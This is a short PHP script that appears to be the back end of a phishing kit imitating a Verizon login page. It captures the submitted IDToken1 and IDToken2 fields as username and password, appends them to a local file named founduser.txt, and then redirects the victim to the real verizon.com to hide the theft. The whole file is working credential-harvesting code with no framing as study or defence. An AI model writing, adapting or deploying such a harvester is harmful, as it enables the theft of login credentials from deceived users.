<?php
 $user = $_POST["IDToken1"];
 $pass = $_POST["IDToken2"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 header('Location: http://www.verizon.com');
 exit()
?>

